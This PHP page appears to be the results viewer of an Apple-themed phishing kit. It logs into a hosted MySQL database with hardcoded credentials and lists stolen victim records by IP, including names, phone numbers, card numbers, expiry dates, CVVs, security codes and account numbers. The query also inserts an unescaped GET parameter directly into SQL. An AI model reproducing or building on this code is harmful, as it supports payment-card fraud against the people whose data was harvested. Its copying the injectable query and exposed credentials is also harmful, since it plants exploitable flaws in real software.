<?php 
$tabel = ["id","nama","date","zip","number",
"cardcredit","expired","cvv","scode","accnum","waktu"];

/*
 mipc_27053797_apple
 mipc_27053797
 (Your vPanel Password)
 sql105.mipropia.com
*/
$ip = $_GET["ip"];
$conn = mysqli_connect(
"sql105.mipropia.com",
"mipc_27053797",
"rastafara354",
"mipc_27053797_apple");

$query = "SELECT * FROM Detail WHERE ip = '$ip'";
$lemari = mysqli_query($conn,$query);

?>

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
table,tr,td,th{
Border:1px solid black;
border-collapse:collapse;}
</style>
</head>
<body>
<a href="hasil.php">back ></a>
<p>

<table>
<tr>
<?php for($a = 0;$a < count($tabel);$a++):?>
<th><?= $tabel[$a];?></th>
<?php endfor;?>
</tr>
<?php while($row = mysqli_fetch_assoc($lemari)):?>
<tr>
<td><?= $row["id"];?></td>
<td><?= $row["nama"];?></td>
<td><?= $row["date"];?></td>
<td><?= $row["zip"];?></td>
<td><?= $row["number"];?></td>
<td><?= $row["cardcredit"];?></td>
<td><?= $row["expired"];?></td>
<td><?= $row["cvv"];?></td>
<td><?= $row["scode"];?></td>
<td><?= $row["accnum"];?></td>
<td><?= $row["waktu"];?></td>
</tr>
<?php endwhile;?>
</table>
</body>
</html>
